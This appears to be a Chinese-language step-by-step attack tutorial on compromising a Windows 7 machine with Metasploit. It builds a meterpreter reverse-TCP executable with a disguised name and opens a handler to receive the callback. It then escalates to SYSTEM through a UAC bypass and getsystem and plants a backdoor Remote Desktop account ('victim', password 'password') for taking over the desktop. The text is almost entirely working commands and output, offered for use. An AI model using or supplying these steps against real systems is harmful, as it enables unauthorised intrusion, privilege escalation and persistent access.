---
title: Windows Reverse TCP
---

# Windows Reverse TCP

目标系统：Windows 7 专业版，Service Pack 1，64位。

工具：Kali Linux

1. 使用`msfvenom`生成payload

   ```shell
   $ msfvenom -p windows/x64/meterpreter/reverse_tcp -b "\x00" LHOST=192.168.15.5 LPORT=4444 -i 5 -f exe -o ./some-fancy-name.exe
   ```

2. 打开`msfconsole`，运行以下命令

   ```shell
   msf > use exploit/multi/handler
   msf exploit(handler) > set LHOST 192.168.15.5
   msf exploit(handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
   msf exploit(handler) > set LPORT 4444
   msf exploit(handler) > exploit
   msf exploit(handler) > back
   ```

3. 想办法让目标下载运行你的payload。这时你会在`msfconsole`中得到提示建立连接，并得到session号（一般是从1号开始）。

4. 进入会话，得到目标系统的`meterpreter`。假设对方是用`Tony`用户打开的payload。

   ```shell
   msf > sessions -i 1
   meterpreter > getuid
   Server username: Tony-PC\Tony
   ```

5. 提权，获得系统权限。

   ```shell
   meterpreter > back
   msf > use exploit/windows/local/bypassuac
   msf exploit(bypassuac) > set SESSION 1
   msf exploit(bypassuac) > set LPORT 4445
   msf exploit(bypassuac) > exploit
   msf exploit(bypassuac) > back
   ```

6. 成功后，提示建立Session 2。进入Session 2，并进行提权。

   ```shell
   msf > sessions -i 2
   meterpreter > getsystem
   meterpreter > getuid
   Server username: NT AUTHORITY\SYSTEM
   ```

7. 获得远程桌面，首先创建账号，并将账号加入远程桌面用户组。

   ```shell
   meterpreter > use incognito
   meterpreter > add_user victim password
   meterpreter > shell
   C:\Windows\system32> net localgroup "Remote Desktop Users" victim /add
   C:\Windows\system32> exit
   ```

8. 再打开一个terminal，运行`rdektop`。

   ```shell
   $ rdesktop 192.168.15.7
   ```

9. 此时，看到目标上有两个用户，其中一个是victim，点击登录，输入密码`password`。此时如果对方正在使用，会得到一个提示框“victim”用户正在试图远程登录。如果对方点“确定”，对方会退出，你就会进入目标的桌面。
